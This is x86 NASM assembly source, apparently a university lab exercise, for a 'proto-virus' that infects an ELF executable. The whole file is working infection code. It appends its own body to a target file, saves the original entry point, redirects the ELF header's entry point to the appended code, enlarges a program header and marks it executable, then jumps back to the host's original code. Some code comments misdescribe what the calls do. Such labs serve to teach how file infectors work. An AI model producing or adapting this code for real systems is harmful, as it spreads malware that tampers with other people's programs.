%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define PHDR_flags 24
%define STDOUT		1
%define ELF_header_size		52

	
;Stack Locations macros: (sub the size of ELF_header(52))
%define FD dword [ebp-4]
%define ELF_header ebp-56
%define FIleSize dword [ebp-60]
%define original_entry_point ebp-64
%define program_header_offset dword [ebp-70]
%define Program_header ebp-102

	global _start

	section .text
_start:
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
	.write_virus_msg:
	call get_loc_ecx
	add  ecx, OutStr
	write STDOUT, ecx, 32

	.open_file:
	call get_loc_ebx
	add ebx, FileName
	open ebx,RDWR, 0x777
	mov FD, eax					;save the file descriptor
	cmp FD, -1
	je open_error

	.read_header:
	lea ecx, [ELF_header]
	read FD,ecx,ELF_header_size				;read the header of ELF
	.cmp_Magic_num:
	cmp dword [ELF_header], 0x464C457F 		; compare the first 4 bytes(MAGICs little endian) to check is ELF
	jne not_elf_error

	.copy_the_virus:
	lseek FD, 0, SEEK_END 					; set the file pointer to the end of the file
	mov FIleSize, eax						; return the size of the file
	call get_loc_ecx
	add ecx, _start
	mov edx , virus_end-_start
	write FD,ecx,edx						; write the content of this script to the end of the file

	.backup_prev_entry_point:
	lseek FD, 0, SEEK_SET 					; set the file pointer to the end of the file
	mov eax, dword [ELF_header+ENTRY]
	mov dword [original_entry_point], eax 	; saving original entry point
		
	.update_return_address:
	lseek FD,-4,SEEK_END					; modifing the last 4 bytes which hold the return address
	lea ecx, [original_entry_point]
	write FD, ecx, 4
	lseek FD,0,SEEK_SET

	.copy_program_header:
	;get start of program header offset 
	mov eax, dword [ELF_header+PHDR_start]	;offset of the program header
	add eax, PHDR_size						;point to the second program heade entry
	mov program_header_offset, eax			;offest of the second program header entry
	lseek FD, program_header_offset, SEEK_SET
	lea ecx, [Program_header]
	read FD,ecx,PHDR_size					;read 32 first byte (header size of ELF)
	lseek FD, 0 ,SEEK_SET					;set the file pointer to the end of the file
	and eax,0
	mov eax, dword [Program_header+PHDR_vaddr]		;eax=phdr_vaddr
	sub eax, dword [Program_header+PHDR_offset]		;eax=phdr_vaddr-offset

	.modify_entry_point:
	add eax, FIleSize
	mov dword [ELF_header+ENTRY], eax
	lea ecx, [ELF_header]
	write FD,ecx,52									;write the modified header back to the file

	lseek FD, 0,SEEK_END							;size of the file
	mov ebx, virus_end-_start 						;size of the virus
	mov ecx,  dword [Program_header+PHDR_offset]
	
	add eax, ebx
	add eax, ecx
	mov dword [Program_header+PHDR_filesize], eax
	mov dword [Program_header+PHDR_memsize], eax
	add dword [Program_header+PHDR_flags], 0x1		;add executable flag
	lseek FD, program_header_offset, SEEK_SET
	lea ecx, [Program_header]
	write FD,ecx,PHDR_size		


	.close_the_modified_file:
	close FD

	.jmp_to_return_address:
	call get_loc_ebx
	add ebx, PreviousEntryPoint
	mov eax, [ebx]
	jmp eax

VirusExit:
	exit 0            	; Termination if all is OK and no previous code to jump to
                        ; (also an example for use of above macros)

open_error:
	call get_loc_ecx
	add  ecx, FailOpen
	write STDOUT, ecx, 19
	jmp Exit
not_elf_error:
	close FD
	call get_loc_ecx
	add  ecx, FailNotELF
	write STDOUT, ecx, 18
Exit:
	exit -1	
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0 ;32 length
Failstr:	db "perhaps not", 10 , 0
FailOpen:   db "error in openning", 10 , 0
FailNotELF: db "error not an elf", 10 , 0

get_loc_ebx:
	call .next_i
	.next_i:
		pop ebx
		sub ebx, .next_i
		ret
	
get_loc_ecx:
	call .next_i
	.next_i:
		pop ecx
		sub ecx, .next_i
		ret

PreviousEntryPoint: dd VirusExit
virus_end:


